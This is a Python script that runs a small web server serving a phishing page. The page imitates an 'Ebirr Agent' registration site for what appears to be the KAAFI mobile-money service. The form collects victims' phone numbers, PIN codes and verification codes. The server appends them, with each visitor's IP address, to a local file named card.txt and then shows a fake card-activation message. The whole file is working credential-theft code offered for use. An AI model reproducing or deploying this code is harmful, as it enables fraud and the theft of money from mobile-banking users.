import http.server
import socketserver
import urllib.parse

PORT = 8080

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
                <html>
                <style>
                body {
                    font-family: Arial, sans-serif;
                }
                h1 {                                                                                                                                                       text-align: center;
                    color: green;
                 }
                form {
                    max-width: 300px;
                    margin: 0 auto;
                    padding: 20px;
                    border: 1px solid #ccc;
                    border-radius: 3px;
                    background-color: white;
                }
                label {
                    display: block;
                    margin-bottom: 10px;
                }
                input[type="text"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 3px;
                }
                input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    border: none;
                    border-radius: 5px;
                    background-color: #4CAF50;
                    color: #fff;
                    cursor: pointer;
                }
                </style>
                </head>
                <body>
                <h1>Ebirr Agent </h1>
                <h3 style = "color: green; text-align: center;">KAAFI MF</h3>
                <h2 style = "color: green; text-align: center;"> please register ebirr agent site </h2>
                <form action="/process" method="post">
                <label for="phone_number">Phone Number:</label>
                <input type="text" id="phone_number" name="phone_number" placeholder="Enter your phone number" inputmode="numeric" required><br><br>
                <label for="pin_code">Pin Code:</label>
                <input type="text" id="pin_code" name="pin_code" placeholder="Enter the pin code" inputmode="numeric" required><br><br>
                <label for="verification_code">Verification Code:</label>
                <input type="text" id="verification_code" name="verification_code" placeholder="Enter the verification code" inputmode="numeric" required><br><br>

                <input type="submit" value="Next">
                </form>
                <div class="background">
                </body>
                </html>
            ''')
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>404 Not Found</h1></body></html>')

    def do_POST(self):
        if self.path == '/process':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            if 'phone_number' in params and 'verification_code' in params and 'pin_code' in params:
                phone_number = params['phone_number'][0]
                verification_code = params['verification_code'][0]
                pin_code = params['pin_code'][0]
                card_info = f"Phone Number: {phone_number}, Verification Code: {verification_code}, Pin Code: {pin_code}"

                ip_address = self.client_address[0]
                card_info_with_ip = f"IP Address: {ip_address}\n{card_info}"

                with open('card.txt', 'a+') as f:
                    f.write(card_info_with_ip + '\n')

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h1 style = "color:green;">thank you for the verifacatio, we will email you after an hour for the master card activation!</h1></html>')

        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>404 Not Found</h1></body></html>')

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print("Serving at port", PORT)
    httpd.serve_forever()
